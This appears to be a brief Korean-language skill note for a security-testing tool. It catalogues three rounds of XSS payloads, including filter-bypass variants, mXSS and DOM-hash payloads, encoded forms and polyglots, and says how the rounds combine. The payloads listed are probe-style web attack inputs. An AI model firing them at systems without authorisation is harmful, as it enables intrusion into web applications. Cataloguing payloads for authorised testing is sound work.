...
type: skill
status: active
when_to_read: XSS 전용 payload rotation / 필터 우회 / DOM/mXSS 페이로드 위치
updated: 2026-04-16
sources:
...
## Payload Rounds
- **Round 1 (`XSS_PAYLOADS`, 20개)**: `<script>alert(1)</script>`, `<img onerror>`, `<svg/onload>`, attribute break `"><script>`, template literal ``${alert(1)}``, `<iframe javascript:>`, mXSS (`<math><mi><mglyph>...`).
- **Round 2 (`XSS_PAYLOADS_ROUND2`, 20개)**: 대소문자 혼용 `<ScRiPt>`, whitespace `<script >`, 탭/개행 split, nested `<scr<script>ipt>`, HTML entity `&#40;`, `<keygen autofocus>`, `<isindex>`, `<iframe srcdoc=>`, `<form formaction=javascript:>`, `xlink:href` SVG.
- **Round 3 (`XSS_PAYLOADS_ROUND3`, 약 16개)**: 0xsobky / rsnake / polyglot_break 폴리글롯, DOM-XSS hash (`#<script>`), base64 data URL, double-URL 인코딩 (`%253C...`), 유니코드 이스케이프 (`\u003c`), mXSS `<noscript><p title=`, CSS expression.

`round >= 4` 또는 `<= 0` → 세 세트 합친 exhaustive.
